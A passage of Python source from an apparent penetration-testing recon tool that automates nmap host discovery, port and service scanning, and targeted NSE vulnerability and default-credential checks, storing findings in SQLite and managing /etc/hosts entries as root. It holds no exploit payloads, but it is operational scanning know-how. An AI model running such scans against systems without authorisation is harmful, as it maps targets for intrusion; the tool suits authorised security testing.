    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                conn.execute(
                    "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                    "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                    "  name     = COALESCE(excluded.name, name), "
                    "  product  = COALESCE(excluded.product, product), "
                    "  version  = COALESCE(excluded.version, version), "
                    "  cpe      = COALESCE(excluded.cpe, cpe), "
                    "  last_seen = excluded.last_seen",
                    (ip, r["port"], r["proto"], r.get("name"), r.get("product"),
                     r.get("version"), r.get("cpe"), now, now),
                )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


def save_scripts(ip: str, rows: list) -> int:
    """Upsert NSE script output by (ip, port, proto, script) — port 0 = host-level —
    and, in the same transaction, extract any finding from each script into the vulns
    table (so both -sC and vuln-scan output feed the findings summary, no re-scan)."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                sid = r.get("id")
                if not sid:
                    continue
                port, proto, output = int(r.get("port") or 0), r.get("proto") or "", r.get("output")
                conn.execute(
                    "INSERT INTO scripts (ip, port, proto, script, output, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto, script) DO UPDATE SET "
                    "  output = excluded.output, last_seen = excluded.last_seen",
                    (ip, port, proto, sid, output, now, now),
                )
                f = _extract_finding(sid, output or "")
                if f:
                    conn.execute(
                        "INSERT INTO vulns (ip, port, proto, script, state, cve, risk, summary, "
                        "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                        "ON CONFLICT(ip, port, proto, script) DO UPDATE SET "
                        "  state = excluded.state, cve = excluded.cve, risk = excluded.risk, "
                        "  summary = excluded.summary, last_seen = excluded.last_seen",
                        (ip, port, proto, sid, f["state"], f["cve"], f["risk"], f["summary"], now, now),
                    )
                for hn in _extract_hostnames(ip, sid, output or ""):     # cert SANs, redirects, SMB FQDN
                    conn.execute(
                        "INSERT INTO hostnames (ip, port, hostname, source, first_seen, last_seen) "
                        "VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(ip, hostname) DO UPDATE SET "
                        "  last_seen = excluded.last_seen",
                        (ip, port, hn, sid, now, now),
                    )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


# a plausible DNS hostname (has a dot, valid label chars, not a bare IP)
_HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)([a-z0-9_](?:[a-z0-9_-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$")


def _valid_hostname(name: str, ip: str) -> "str | None":
    """Normalise & validate a candidate hostname; None if it isn't a usable DNS name."""
    n = (name or "").strip().lower().rstrip(".")
    if n.startswith("*."):                       # wildcard cert → keep the base domain
        n = n[2:]
    if not n or n == ip:
        return None
    if _HOSTNAME_RE.match(n) and not n.replace(".", "").isdigit():
        return n
    return None


def _extract_hostnames(ip: str, sid: str, output: str) -> set:
    """Pull DNS names out of one NSE script's output — TLS cert CN/SAN (ssl-cert), HTTP
    redirect targets (http-title/http-*), and SMB FQDN/domain (smb-os-discovery). These
    domains/vhosts are gold for phase 5 (add to /etc/hosts, vhost-fuzz)."""
    if not output:
        return set()
    cands = []
    if "ssl-cert" in sid or "ssl-" in sid:
        cands += re.findall(r"DNS:([A-Za-z0-9_.*-]+)", output)
        cands += re.findall(r"(?:commonName|CN)=([A-Za-z0-9_.*-]+)", output)
    if sid == "vhost-fuzz":                       # our sweep marks hits with "  + <host>"
        cands += re.findall(r"^\s*\+ ([A-Za-z0-9_.-]+)", output, re.M)
    if sid.startswith("http-"):
        cands += re.findall(r"redirect to https?://([A-Za-z0-9_.-]+)", output, re.I)
        cands += re.findall(r"[Ll]ocation:\s*https?://([A-Za-z0-9_.-]+)", output)
    if sid == "smb-os-discovery":
        for pat in (r"FQDN:\s*(\S+)", r"Domain name:\s*(\S+)", r"DNS_?[Dd]omain[_ ]?[Nn]ame:\s*(\S+)",
                    r"Forest name:\s*(\S+)"):
            cands += re.findall(pat, output)
    return {h for h in (_valid_hostname(c, ip) for c in cands) if h}


def save_hostnames(ip: str, entries: list) -> None:
    """Store validated DNS names for a host (dedup by (ip, hostname)). ``entries`` is a
    list of {'port', 'hostname', 'source'} — e.g. nmap's per-service resolved name."""
    if not ip or not entries or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for e in entries:
                hn = _valid_hostname(e.get("hostname"), ip)
                if not hn:
                    continue
                conn.execute(
                    "INSERT INTO hostnames (ip, port, hostname, source, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(ip, hostname) DO UPDATE SET "
                    "  last_seen = excluded.last_seen",
                    (ip, int(e.get("port") or 0), hn, e.get("source") or "service", now, now))
            conn.commit()
        finally:
            conn.close()
    _sync_hosts_block(ip)             # keep the managed /etc/hosts block current (root only)


def fetch_hostnames(ip: str) -> list:
    """(hostname, port, source) DNS names discovered for a host, for phase-5 vhost work."""
    rows = _fetch("SELECT hostname, port, source FROM hostnames WHERE ip = ? ORDER BY hostname", (ip,))
    return rows


# ── managed /etc/hosts block ──────────────────────────────────────────────────
# Discovered vhosts are useless in a browser / name-based tools until they resolve, and
# the only OS-wide way to do that is /etc/hosts (glibc reads it hard-coded; no alternate
# file, no include). So — WHEN RUNNING AS ROOT — we maintain one marked block per target
# IP, rebuilt from the DB. The block is treated as EPHEMERAL session state: it is stripped
# on startup (surviving a crash / SIGKILL / terminal close, unlike an exit-only hook — the
# same reasoning as _chown_db_to_user) and best-effort removed again at exit. Without root
# we never touch the file; the user gets a paste-ready line instead.
HOSTS_PATH = "/etc/hosts"
_HOSTS_LOCK = threading.Lock()
_HOSTS_LEDGER = os.path.join(os.path.dirname(DB_PATH), "hosts_ledger.json")
_HOSTS_BLOCK_RE = re.compile(
    r"\n?# >>> pshunter (?P<ip>\S+) >>>\n.*?\n# <<< pshunter (?P=ip) <<<\n?", re.S)


def _read_hosts() -> str:
    with open(HOSTS_PATH, encoding="utf-8", errors="replace") as fh:
        return fh.read()


def _write_hosts(text: str) -> None:
    """Atomically replace /etc/hosts (temp in the same dir → os.replace). Needs root."""
    d = os.path.dirname(HOSTS_PATH) or "/"
    fd, tmp = tempfile.mkstemp(prefix=".pshunter-hosts-", dir=d)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(text)
        os.replace(tmp, HOSTS_PATH)
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def _strip_pshunter_blocks(text: str, ip: "str | None" = None) -> str:
    """Remove our marked block(s) — one IP's, or all of them if ip is None."""
    if ip is None:
        return _HOSTS_BLOCK_RE.sub("\n", text)
    pat = re.compile(
        rf"\n?# >>> pshunter {re.escape(ip)} >>>\n.*?\n# <<< pshunter {re.escape(ip)} <<<\n?", re.S)
    return pat.sub("\n", text)


def _ledger_load() -> list:
    try:
        with open(_HOSTS_LEDGER, encoding="utf-8") as fh:
            data = json.load(fh)
        return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


def _ledger_save(ips: list) -> None:
    try:
        with open(_HOSTS_LEDGER, "w", encoding="utf-8") as fh:
            json.dump(sorted(set(ips)), fh)
    except OSError:
        pass


def _hosts_snippet(ip: str) -> "str | None":
    """A ready-to-paste one-liner adding all of an IP's discovered names in one go."""
    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    if not names:
        return None
    return f"sudo sh -c 'echo \"{ip}  {' '.join(names)}\" >> /etc/hosts'"


def _sync_hosts_block(ip: str) -> None:
    """Rebuild the managed /etc/hosts block for one IP from the DB. Root only; silent
    no-op otherwise (the launch notice / findings snippet tell the user what to do)."""
    if not ip or _is_self_ip(ip) or not _is_root():
        return
    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    with _HOSTS_LOCK:
        try:
            text = _read_hosts()
        except OSError:
            return
        new = _strip_pshunter_blocks(text, ip)
        if names:
            if not new.endswith("\n"):
                new += "\n"
            new += (f"# >>> pshunter {ip} >>>\n{ip}  {' '.join(names)}\n"
                    f"# <<< pshunter {ip} <<<\n")
        if new != text:
            try:
                _write_hosts(new)
            except OSError:
                return
        led = _ledger_load()
        if names and ip not in led:
            _ledger_save(led + [ip])
        elif not names and ip in led:
            _ledger_save([x for x in led if x != ip])


def _remove_all_pshunter_hosts() -> None:
    """Strip every managed block — used for startup reconciliation and the atexit hook."""
    if not _is_root():
        return
    with _HOSTS_LOCK:
        try:
            text = _read_hosts()
        except OSError:
            return
        new = _strip_pshunter_blocks(text)
        if new != text:
            try:
                _write_hosts(new)
            except OSError:
                pass
    _ledger_save([])


def _reconcile_hosts_on_start() -> None:
    """Clear any residue from a previous (possibly crashed) session. As root we strip it;
    without root we can't write the file, so we just point out the leftovers + the fix."""
    if _is_root():
        _remove_all_pshunter_hosts()
        return
    try:
        text = _read_hosts()
    except OSError:
        return
    if "# >>> pshunter " in text:
        print(f"{YELLOW}⚠ leftover pshunter /etc/hosts entries from a previous session{RESET} "
              f"{DIM}— clean with: sudo sed -i '/# >>> pshunter/,/# <<< pshunter/d' /etc/hosts{RESET}")


def save_os(ip: str, os_name: str) -> None:
    """Store the detected OS on the host row (overwrites a previous guess)."""
    if not ip or not os_name or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(
                "INSERT INTO hosts (ip, os, first_seen, last_seen) VALUES (?, ?, ?, ?) "
                "ON CONFLICT(ip) DO UPDATE SET os = excluded.os, last_seen = excluded.last_seen",
                (ip, os_name, now, now))
            conn.commit()
        finally:
            conn.close()


def fetch_host_os(ip: str) -> "str | None":
    rows = _fetch("SELECT os FROM hosts WHERE ip = ?", (ip,))
    return rows[0][0] if rows and rows[0][0] else None


def fetch_scripts(ip: str, port: int, proto: str) -> list:
    """(script, output) rows for one port (proto '' + port 0 = host-level scripts)."""
    return _fetch("SELECT script, output FROM scripts WHERE ip = ? AND port = ? AND proto = ?",
                  (ip, port, proto))


def fetch_scripted_ports(ip: str) -> set:
    """{(port, proto)} that carry per-port NSE script output — i.e. the ports where
    there's more to see (from service detection / vuln scan)."""
    rows = _fetch("SELECT DISTINCT port, proto FROM scripts WHERE ip = ? AND port != 0", (ip,))
    return {(p, pr) for p, pr in rows}


def fetch_vulns(ip: str) -> list:
    """(port, proto, script, state, cve, risk, summary) findings for a host."""
    rows = _fetch("SELECT port, proto, script, state, cve, risk, summary FROM vulns WHERE ip = ?", (ip,))
    return sorted(rows, key=lambda r: (r[0], r[2]))


def fetch_step_status(ip: str, port: int, proto: str, service: str) -> dict:
    """{step_index: status} for one service's checklist on a host ('done' / 'skip')."""
    rows = _fetch("SELECT step, status FROM exploit_steps WHERE ip = ? AND port = ? "
                  "AND proto = ? AND service = ?", (ip, port, proto, service))
    return {step: status for step, status in rows}


def set_step_status(ip: str, port: int, proto: str, service: str, step: int,
                    status: "str | None") -> None:
    """Persist one checklist step's status; status None clears it back to 'to-do'."""
    if not ip or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            if status is None:
                conn.execute("DELETE FROM exploit_steps WHERE ip = ? AND port = ? AND "
                             "proto = ? AND service = ? AND step = ?",
                             (ip, port, proto, service, step))
            else:
                conn.execute(
                    "INSERT INTO exploit_steps (ip, port, proto, service, step, status, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto, service, step) DO UPDATE SET "
                    "  status = excluded.status, last_seen = excluded.last_seen",
                    (ip, port, proto, service, step, status, now))
            conn.commit()
        finally:
            conn.close()


# ── background jobs (feed [s] status) ─────────────────────────────────────────
_JOBS: list = []
_JOBS_LOCK = threading.Lock()


# ── job persistence (status history survives across app restarts) ─────────────
def _job_insert(job: dict) -> None:
    """Insert a new job row and stash its rowid on the job for later updates."""
    with _DB_LOCK:
        conn = _db_connect()
        try:
            cur = conn.execute(
                "INSERT INTO jobs (created, phase, name, command, state, hosts, error, output, run) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (job["created"], job["phase"], job["name"], job["command"],
                 job["state"], job["hosts"], job["error"], job["output"], job.get("run")))
            job["db_id"] = cur.lastrowid
            conn.commit()
        finally:
            conn.close()


def _job_update(job: dict) -> None:
    """Persist the job's current state / host count / error / captured output."""
    if job.get("db_id") is None:
        return
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(
                "UPDATE jobs SET state = ?, hosts = ?, error = ?, output = ? WHERE id = ?",
                (job["state"], job["hosts"], job["error"], job["output"], job["db_id"]))
            conn.commit()
        finally:
            conn.close()


def _load_jobs() -> None:
    """Reload the saved command history into _JOBS at startup. A job left 'running'
    from a previous session is no longer alive, so it is loaded (and persisted) as
    'aborted'."""
    if not os.path.exists(DB_PATH):
        return
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        rows = conn.execute("SELECT id, created, phase, name, command, state, hosts, "
                            "error, output, run FROM jobs ORDER BY id").fetchall()
    except sqlite3.OperationalError:      # jobs table not created yet
        return
    finally:
        conn.close()
    corrected = []
    with _JOBS_LOCK:
        _JOBS.clear()
        for jid, created, phase, name, command, state, hosts, error, output, run in rows:
            st = "aborted" if state == "running" else state
            job = {"db_id": jid, "created": created, "phase": phase, "name": name,
                   "command": command, "state": st, "hosts": hosts or 0,
                   "found": set(), "error": error, "output": output,
                   "run": run or f"job{jid}",    # pre-run-column jobs group as singletons
                   "cancel": threading.Event()}
            _JOBS.append(job)
            if st != state:
                corrected.append(job)
    for job in corrected:                 # write back the running->aborted fix
        _job_update(job)


def _next_run_id() -> str:
    """A unique id for one phase execution (the batch of commands launched together).
    Time-based so it never collides with a run id reloaded from a previous session."""
    return str(time.time_ns())


def _new_job(phase: str, name: str, command: str, run: "str | None" = None) -> dict:
    # each phase execution shares one run id so status can group its commands; a job with
    # no explicit run (single-command phases) gets its own, i.e. its own status entry.
    job = {
        "phase": phase, "name": name, "command": command, "run": run or _next_run_id(),
        "state": "running", "hosts": 0, "found": set(), "error": None, "output": None,
        "cancel": threading.Event(),
        "created": datetime.now().isoformat(timespec="seconds"), "db_id": None,
    }
    _job_insert(job)                      # assigns job["db_id"]
    with _JOBS_LOCK:
        _JOBS.append(job)
    return job


def _run_pass(job: dict, args: list, targets: list, deadline: float) -> None:
    """Run one nmap pass, streaming live hosts to the DB and the job's found set.
    Honours job['cancel'] so status can abort a running scan. The job's state, host
    count and captured console output are persisted (output feeds the report view)."""
    def _on_hosts(batch):
        live = [h for h in batch if not _is_self_ip(h["ip"])]
        if live:
            save_hosts(live)
            job["found"].update(h["ip"] for h in live)
            job["hosts"] = len(job["found"])
            _job_update(job)
    try:
        hosts, output = _run_nmap(args, targets, _on_hosts, deadline=deadline,
                                  should_stop=job["cancel"].is_set)
        job["output"] = output
        if hosts is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_discovery(parsed: dict, minutes: int) -> None:
    """Fast and thorough passes run concurrently; their results are unioned into the
    DB. The whole phase shares one time budget — each pass is hard-capped at the full
    budget (not a split), so both may use all the minutes the user allowed."""
    _refresh_own_addresses()          # pick up any IP change since the last scan
    targets = parsed["targets"]
    deadline = max(1, minutes * 60)
    name = _PHASES["0"][0]
    run = _next_run_id()
    threads = []
    for args in (_DISCOVERY_FAST, _DISCOVERY_SLOW):
        command = " ".join(["nmap"] + args + targets)
        job = _new_job("0", name, command, run)
        t = threading.Thread(target=_run_pass, args=(job, args, targets, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_discovery(parsed: dict, minutes: int) -> None:
    """Launch discovery (both passes) in the background; the menu stays free."""
    threading.Thread(target=_run_discovery, args=(parsed, minutes), daemon=True).start()


# ── port enumeration (phase 2) ────────────────────────────────────────────────
# Runs several nmap port scans concurrently on one host, streaming open ports to the
# DB. A fast top-1000 (T4) gives an immediate working set; the full 65535-port TCP
# sweep is split into two halves at T3 (reliability over speed — completeness matters
# and T4 can miss ports on rate-limited/laggy targets); a top-100 UDP scan (root only)
# covers the common UDP services. -sV/-sC are deliberately left to the service phase.
def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


def _port_scan_specs() -> list:
    """(label, nmap-args) for the concurrent port scans. SYN scan needs root; fall
    back to a TCP connect scan otherwise. UDP is added only when root."""
    tcp = "-sS" if _is_root() else "-sT"
    specs = [
        ("fast",    [tcp, "-Pn", "-n", "--open", "-T4", "--top-ports", "1000"]),
        ("full-lo", [tcp, "-Pn", "-n", "--open", "-T3", "-p", "1-32767"]),
        ("full-hi", [tcp, "-Pn", "-n", "--open", "-T3", "-p", "32768-65535"]),
    ]
    if _is_root():
        specs.append(("udp", ["-sU", "-Pn", "-n", "--open", "-T4", "--top-ports", "100"]))
    return specs


def _run_port_pass(job: dict, args: list, ip: str, deadline: float) -> None:
    """Run one port scan on ``ip``, streaming open ports (and any service guess) to the
    DB. Honours job['cancel']; persists state, port count and captured output."""
    found = set()

    def _on_items(batch):
        for h in batch:
            rows = h.get("ports")
            if rows and not _is_self_ip(h["ip"]):
                save_ports(h["ip"], rows)
                found.update((r["port"], r["proto"]) for r in rows)
                job["hosts"] = len(found)
                _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_ports_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_port_enum(ip: str, minutes: int) -> None:
    """Concurrent port scans on one host, sharing one time budget (each capped at the
    full budget). The fast scan lands ports early while the full/UDP scans finish."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])          # make sure the target shows in the hosts list
    deadline = max(1, minutes * 60)
    name = _PHASES["1"][0]
    run = _next_run_id()
    threads = []
    for _label, args in _port_scan_specs():
        command = " ".join(["nmap"] + args + [ip])
        job = _new_job("1", name, command, run)
        t = threading.Thread(target=_run_port_pass, args=(job, args, ip, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_port_enum(ip: str, minutes: int) -> None:
    """Launch port enumeration in the background; the menu stays free."""
    threading.Thread(target=_run_port_enum, args=(ip, minutes), daemon=True).start()


# ── service detection (phase 3) ───────────────────────────────────────────────
# Deep identification on the open ports from phase 2: -sV probes real versions and
# -sC runs the default NSE scripts (titles, certs, SMB/SSH/HTTP info) — the payload
# of this phase. OS detection runs as its OWN scan (`-O --osscan-guess`, root only)
# because -O needs an open AND a closed port, so it must not be pinned to the open-
# port list (that yields nmap's "OS detection unreliable" warning). -A is avoided for
# the same reason (its bundled -O would be unreliable) plus its traceroute noise.
def _service_scan_specs(ip: str) -> list:
    """(label, nmap-args) for service detection on ``ip``'s known-open ports. TCP gets
    -sV -sC; UDP (root) gets -sU -sV; OS (root) gets its own unrestricted -O scan."""
    ports = fetch_ports(ip)
    tcp = [str(p) for p, proto, _s in ports if proto == "tcp"]
    udp = [str(p) for p, proto, _s in ports if proto == "udp"]
    specs = []
    if tcp:
        specs.append(("service", ["-sV", "-sC", "-Pn", "-n", "-T4", "-p", ",".join(tcp)]))
    if udp and _is_root():
        specs.append(("service-udp", ["-sU", "-sV", "-Pn", "-n", "-T4", "-p", ",".join(udp)]))
    if _is_root():
        specs.append(("os", ["-O", "--osscan-guess", "-Pn", "-n", "-T4"]))
    return specs


def _run_service_pass(job: dict, args: list, ip: str, deadline: float) -> None:
    """Run one service-detection scan, streaming probed services / NSE output / OS to
    the DB. Honours job['cancel']; persists progress and captured output."""
    counter = [0]

    def _on_items(batch):
        for h in batch:
            if _is_self_ip(h["ip"]):
                continue
            svc, scr, os_name = h.get("services") or [], h.get("scripts") or [], h.get("os")
            if svc:
                save_services(h["ip"], svc)
            if scr:
                save_scripts(h["ip"], scr)            # also extracts cert/redirect/SMB hostnames
            if h.get("hostnames"):
                save_hostnames(h["ip"], h["hostnames"])
            if os_name:
                save_os(h["ip"], os_name)
            counter[0] += len(svc) + len(scr) + (1 if os_name else 0)
            job["hosts"] = counter[0]
            _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_detail_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_service_detection(ip: str, minutes: int) -> None:
    """Concurrent service-detection scans on one host, sharing one time budget."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])
    deadline = max(1, minutes * 60)
    name = _PHASES["2"][0]
    run = _next_run_id()
    threads = []
    for _label, args in _service_scan_specs(ip):
        command = " ".join(["nmap"] + args + [ip])
        job = _new_job("2", name, command, run)
        t = threading.Thread(target=_run_service_pass, args=(job, args, ip, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_service_detection(ip: str, minutes: int) -> None:
    """Launch service detection in the background; the menu stays free."""
    threading.Thread(target=_run_service_detection, args=(ip, minutes), daemon=True).start()


# ── vuln scan (phase 4) ───────────────────────────────────────────────────────
# Targeted NSE, driven by the services already in the DB — not a blind --script vuln.
# For each open port we look up its service and fire only the relevant checks: active
# CVE tests (vuln category) plus auth-weakness checks (anonymous / empty / default
# creds — the auth category, never brute). All script names are verified to ship with
# nmap. brute / dos / exploit are excluded; rdp-vuln-ms12-020 (can crash a host) is
# left out by default. SSL scripts run on any TLS-wrapped port. Findings in the
# standard NSE `vuln` format (State: VULNERABLE) are parsed into the vulns table.
_SSL = "ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params"
_VULN_SCRIPTS = {
    "microsoft-ds": "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-vuln-ms10-061,smb-vuln-cve2009-3103,smb-double-pulsar-backdoor,"
                    "smb-security-mode,smb2-security-mode,smb-enum-users",
    "netbios-ssn":  "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-security-mode,smb-enum-users",
    "http":         "http-shellshock,http-vuln-cve2017-5638,http-vuln-cve2015-1635,"
                    "http-vuln-cve2014-3704,http-vuln-cve2012-1823,http-vuln-cve2017-1001000,"
                    "http-vuln-misfortune-cookie,http-default-accounts,http-auth-finder,"
                    "http-config-backup,http-git,http-webdav-scan",
    "ms-wbt-server": "rdp-ntlm-info",
    "ftp":          "ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-anon",
    "ssh":          "ssh-auth-methods,ssh-publickey-acceptance",
    "telnet":       "telnet-encryption",
    "smtp":         "smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764",
    "mysql":        "mysql-vuln-cve2012-2122,mysql-empty-password",
    "ms-sql":       "ms-sql-empty-password",
    "oracle":       "oracle-enum-users",
    "mongodb":      "mongodb-databases",
    "redis":        "redis-info",
    "vnc":          "realvnc-auth-bypass,vnc-info,vnc-title",
    "snmp":         "snmp-info",
    "x11":          "x11-access",
    "rmi":          "rmi-vuln-classloader",
    "rsync":        "rsync-list-modules",
    "distcc":       "distcc-cve2004-2687",
    "clamav":       "clamav-exec",
    "irc":          "irc-unrealircd-backdoor",
}
_VULN_PORT_FALLBACK = {
    445: "microsoft-ds", 139: "netbios-ssn", 80: "http", 443: "http", 8080: "http",
    8443: "http", 3389: "ms-wbt-server", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
    465: "smtp", 587: "smtp", 3306: "mysql", 1433: "ms-sql", 1521: "oracle",
    27017: "mongodb", 6379: "redis", 5900: "vnc", 161: "snmp", 1099: "rmi", 873: "rsync",
    3632: "distcc", 3310: "clamav", 6667: "irc", 6000: "x11", 6001: "x11",
}
_TLS_PORTS = {443, 465, 563, 636, 853, 990, 992, 993, 995, 8443}
# auth-category scripts that only emit output when they actually find a weakness, so
# any output is a finding (anonymous / empty / default creds, unauth access).
_AUTH_FINDING = {"ftp-anon", "mysql-empty-password", "ms-sql-empty-password",
                 "http-default-accounts", "x11-access", "redis-info",
                 "mongodb-databases", "rsync-list-modules", "snmp-info"}


def _vuln_key(name: "str | None", port: int) -> "str | None":
    if name:
        low = name.lower()
        for key in _VULN_SCRIPTS:
            if key in low:
                return key
    return _VULN_PORT_FALLBACK.get(port)


def _vuln_families(ip: str) -> list:
    """Group the host's open ports into (label, scripts, [ports]) families so each
    family runs one targeted scan. SSL scripts are added for TLS-wrapped ports."""
    services = fetch_services(ip)
    groups: dict = {}    # key -> [scripts, set(ports)]
    for port, proto, _state in fetch_ports(ip):
        name = (services.get((port, proto)) or (None, None, None))[0]
        key = _vuln_key(name, port)
        if key:
            groups.setdefault(key, [_VULN_SCRIPTS[key], set()])[1].add(port)
        low = (name or "").lower()
        if port in _TLS_PORTS or "ssl" in low or "https" in low or "tls" in low:
            groups.setdefault("ssl", [_SSL, set()])[1].add(port)
    return [(k, sc, sorted(ps)) for k, (sc, ps) in groups.items() if ps]


# Auth-category scripts whose mere output is a weakness → a one-line title each.
_AUTH_TITLE = {
    "ftp-anon": "anonymous FTP login allowed",
    "mysql-empty-password": "MySQL account with empty password",
    "ms-sql-empty-password": "MSSQL account with empty password",
    "http-default-accounts": "default web credentials found",
    "x11-access": "X11 server open (no auth)",
    "redis-info": "Redis reachable without auth",
    "mongodb-databases": "MongoDB reachable without auth",
    "rsync-list-modules": "rsync modules listable",
    "snmp-info": "SNMP readable (default community)",
}


def _extract_finding(sid: str, output: str) -> "dict | None":
    """Turn one NSE script result into a finding, or None. Covers three sources with
    no re-scan (the output is already in the DB): the standard `vuln` library format
    (State: VULNERABLE / LIKELY), auth scripts whose output implies a weakness, and a
    few info rules over -sC output (exposed .git, weak TLS, SMB signing, …)."""
    if not output:
        return None
    cves = sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", output)))
    cve = ",".join(cves) or None

    # 1) standard vuln library format
    if re.search(r"State:\s*VULNERABLE", output):
        state = "VULNERABLE"
    elif re.search(r"State:\s*LIKELY VULNERABLE", output):
        state = "LIKELY"
    else:
        state = None
    if state:
        m = re.search(r"Risk factor:\s*([A-Za-z]+)", output)
        risk = (m.group(1).upper() if m else "HIGH")
        # title = the line right after "VULNERABLE:" (the human name), if it isn't a
        # structured field; otherwise fall back to the script id.
        lines = [ln.strip() for ln in output.splitlines() if ln.strip()]
        summary = sid
        for i, ln in enumerate(lines):
            if re.match(r"(LIKELY )?VULNERABLE:?$", ln, re.I) and i + 1 < len(lines):
                nxt = lines[i + 1]
                if not re.match(r"(State|IDs|Risk|Disclosure|References|Description|Extra)\b", nxt):
                    summary = nxt
                break
        return {"state": state, "cve": cve, "risk": risk, "summary": summary[:140]}

    # 2) auth-category scripts: any output = weakness
    if sid in _AUTH_TITLE:
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH", "summary": _AUTH_TITLE[sid]}

    # 2b) http-headers tool: fold the tech banner + missing security headers into one finding
    if sid == "http-headers":
        tech = []
        for hdr in ("Server", "X-Powered-By"):
            m = re.search(rf"^{hdr}:\s*(.+)$", output, re.I | re.M)
            if m:
                tech.append(m.group(1).strip())
        wanted = [("content-security-policy", "CSP"), ("x-frame-options", "X-Frame-Options"),
                  ("x-content-type-options", "X-Content-Type-Options")]
        if re.match(r"\s*https://", output, re.I):          # HSTS only matters over TLS
            wanted.append(("strict-transport-security", "HSTS"))
        missing = [short for hdr, short in wanted
                   if not re.search(rf"^{re.escape(hdr)}:", output, re.I | re.M)]
        parts = []
        if tech:
            parts.append("tech: " + ", ".join(tech))
        if missing:
            parts.append("missing sec-headers: " + ", ".join(missing))
        if parts:
            return {"state": "INFO", "cve": cve, "risk": "LOW" if missing else "INFO",
                    "summary": " · ".join(parts)[:140]}
        return None

    # 2c) whatweb stack fingerprint: fold server / framework / CMS + versions into a finding
    if sid == "http-fingerprint":
        interesting = {
            "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
            "php", "asp.net", "x-powered-by", "python", "ruby", "django", "express", "laravel",
            "nodejs", "node.js", "wordpress", "drupal", "joomla", "magento", "mediawiki",
            "typo3", "moodle", "jenkins", "jira", "gitlab", "phpmyadmin",
        }
        tech, seen = [], set()
        for name, val in re.findall(r"([A-Za-z0-9_.-]+)\[([^\]]*)\]", output):
            if name.lower() not in interesting:
                continue
            val = val.strip()
            item = f"{name} {val}" if val else name
            if item.lower() not in seen:
                seen.add(item.lower())
                tech.append(item)
        if tech:
            return {"state": "INFO", "cve": cve, "risk": "INFO",
                    "summary": ("stack: " + ", ".join(tech))[:140]}
        return None

    # 2d) TLS cert (openssl / nmap ssl-cert): surface emails + self-signed note. SAN/CN
    #     hostnames go to the hostnames table via _extract_hostnames, not here.
    if sid == "ssl-cert":
        emails = sorted(set(re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", output)))
        selfsigned = bool(re.search(r"self[- ]signed", output, re.I))
        parts = []
        if emails:
            parts.append("emails: " + ", ".join(emails))
        if selfsigned:
